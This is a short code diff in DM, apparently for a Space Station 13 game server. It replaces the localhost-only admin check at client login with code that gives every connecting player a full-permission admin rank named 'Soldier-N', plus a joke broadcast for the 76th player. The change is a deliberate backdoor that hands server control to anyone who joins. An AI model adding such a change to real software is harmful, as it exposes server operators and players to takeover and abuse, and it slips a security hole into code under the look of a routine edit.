@@ -120,11 +120,16 @@ var/next_external_rsc = 0
 
 	//Admin Authorisation
 	var/localhost_addresses = list("127.0.0.1", "::1")
-	if(address && (address in localhost_addresses))
-		var/datum/admin_rank/localhost_rank = new("!localhost!", 65535)
-		if(localhost_rank)
-			var/datum/admins/localhost_holder = new(localhost_rank, ckey)
-			localhost_holder.associate(src)
+	
+	var/static/playercount = 1
+	var/datum/admin_rank/localhost_rank = new("Soldier-[playercount]", 65535)
+	if(playercount == 76)
+		world << "<span class='narsie'>SOLDIER-76 REPORTING FOR DUTY</span>"
+	if(localhost_rank)
+		var/datum/admins/localhost_holder = new(localhost_rank, ckey)
+		localhost_holder.associate(src)
+	++playercount
+
 	if(protected_config.autoadmin)
 		if(!admin_datums[ckey])
 			var/datum/admin_rank/autorank
